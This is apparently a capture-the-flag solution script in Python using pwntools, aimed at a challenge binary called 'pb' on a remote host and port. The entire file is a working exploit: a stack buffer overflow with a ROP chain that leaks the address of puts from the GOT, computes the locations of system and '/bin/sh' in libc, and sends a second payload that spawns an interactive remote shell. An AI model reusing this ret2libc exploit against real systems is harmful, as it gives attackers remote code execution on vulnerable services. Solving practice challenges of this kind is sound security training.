""" Solution

    Really good stuff here: https://github.com/Naetw/CTF-pwn-tips/blob/master/README.md#find-binsh-or-sh-in-library

    """

from pwn import *
from time import sleep

context.binary = './pb'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = '178.62.64.13'
PORT = 31434

def get_process():
  #proc = process()
  proc = remote(HOST, PORT)

  return proc

def attach_gdb(proc):
  gdb.attach(proc, gdbscript="""
  """)
  sleep(1)

def main():
  proc = get_process()
  #attach_gdb(proc)

  
  # Addresses
  got_puts = p64(context.binary.got['puts'])
  plt_puts = p64(context.binary.plt['puts'])

  glibc = ELF('./glibc/libc.so.6')
  libc_puts = p64(glibc.symbols['puts'])
  libc_system = p64(glibc.symbols['system'])
  libc_binsh = p64(next(glibc.search(b'/bin/sh\x00')))

  offset = u64(libc_puts) - u64(libc_system)
  binsh_offset = u64(libc_puts) - u64(libc_binsh)

  g_pop_rdi = p64(0x40142b)
  g_pop_rsi_pop_r15 = p64(0x401429)
  g_ret = p64(0x401016)
  f_box = p64(context.binary.symbols['box'])

  payload = b''.join([
    b'A'*0x38,
    g_pop_rdi,
    got_puts,
    plt_puts,
    f_box,
  ])

  # Send payload and leak mem address
  proc.sendlineafter(b'>>', b'2')
  proc.sendlineafter(b'Insert location of the library: ', payload)
  proc.recvline()
  proc.recvline()
  proc.recvline()

  # Calc offsets
  puts_address = proc.recvline().strip()
  system = int.from_bytes(puts_address, 'little') - offset
  binsh = int.from_bytes(puts_address, 'little') - binsh_offset

  payload = b''.join([
    b'A'*0x38,
    g_pop_rdi,
    p64(binsh),
    g_ret, # need it for alignment
    p64(system)
  ])

  # Call system('/bin/sh')
  proc.sendlineafter(b'>>', b'2')
  proc.sendlineafter(b'Insert location of the library: ', payload)
  
  proc.interactive()

if __name__ == '__main__':
  main()
